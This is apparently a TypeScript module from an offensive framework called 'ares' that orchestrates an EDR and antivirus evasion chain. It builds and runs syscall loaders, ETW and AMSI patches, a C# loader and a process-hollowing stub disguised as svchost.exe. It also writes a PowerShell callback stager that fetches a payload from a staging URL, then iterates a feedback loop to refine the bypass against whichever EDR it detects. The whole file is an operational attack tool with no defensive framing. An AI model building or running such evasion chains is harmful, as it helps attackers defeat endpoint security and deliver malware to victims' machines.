/**
 * @module ares/evasion_engine
 * Unified advanced EDR/AV evasion — build, run, and materialize full bypass chain.
 */
import { EvasionExecutor, buildPowerShellStager } from "../evasion.ts"
import { EDREvasionEngine } from "../edr_evasion.ts"
import { auditDefenses } from "../counter_intel.ts"
import { runEdrFeedbackLoop } from "../edr_feedback_loop.ts"
import { generateProcessHollowingStub } from "../malware_dev.ts"
import { ensureAresDir, liveRequired, writeArtifact } from "./_base.ts"
import { execEvasionPlans, step, type ExecStep } from "./_integrations.ts"

export interface EvasionEngineResult {
  techniques: string[]
  artifacts: string[]
  steps: ExecStep[]
  chain: Record<string, unknown>
  edrFeedback?: unknown
  built: boolean
  executed: boolean
  summary: string
}

export async function runEvasionEngine(opts: {
  live?: boolean
  targetEdr?: string
  target?: string
}): Promise<EvasionEngineResult> {
  liveRequired("ares_evasion_engine", opts)
  const dir = ensureAresDir("evasion")
  const exec = new EvasionExecutor(dir)
  const edr = new EDREvasionEngine()
  const techniques: string[] = []
  const artifacts: string[] = []
  const steps: ExecStep[] = []
  let built = false
  let executed = false

  const intel = auditDefenses({ live: true, check: "all" })
  steps.push(step("edr_audit", true, JSON.stringify(intel.edrDetected ?? []).slice(0, 300)))
  writeArtifact("evasion", "counter_intel.json", JSON.stringify(intel, null, 2))

  for (const name of ["syscall-loader-c", "etw-patch-c", "amsi-patch-c", "csharp-loader"] as const) {
    const builtArt = await exec.build(name)
    techniques.push(name)
    if (builtArt.artifact) artifacts.push(builtArt.artifact)
    if (builtArt.status === "built") built = true
    const runResult = await exec.run(name, { live: true, target: opts.target ?? "127.0.0.1" })
    if (runResult.status === "executed") executed = true
    steps.push(step(name, builtArt.status === "built" || builtArt.status === "generated", String(runResult.status)))
  }

  steps.push(...await execEvasionPlans(edr, "evasion"))

  const hollowing = writeArtifact("evasion", "process_hollow.c", generateProcessHollowingStub("svchost.exe"))
  artifacts.push(hollowing)
  techniques.push("process_hollowing", "module_stomping", "indirect_syscalls", "heavens_gate")

  const stager = buildPowerShellStager("http://127.0.0.1:8080/stage", "amsi-reflection")
  artifacts.push(writeArtifact("evasion", "callback_stager.ps1", stager))

  const chain = edr.fullBypassChain(opts.targetEdr ?? intel.edrDetected?.[0] ?? "generic")
  writeArtifact("evasion", "full_chain.json", JSON.stringify(chain, null, 2))
  techniques.push("full_bypass_chain")

  const edrFeedback = await runEdrFeedbackLoop({ live: true, maxIterations: 2 })
  steps.push(step("edr_feedback_loop", edrFeedback.iterations.length > 0, edrFeedback.summary))

  return {
    techniques,
    artifacts,
    steps,
    chain,
    edrFeedback,
    built,
    executed,
    summary: `Evasion engine: ${techniques.length} techniques, built=${built}, executed=${executed}, EDR loop=${edrFeedback.finalChannel}`,
  }
}

export default { runEvasionEngine }
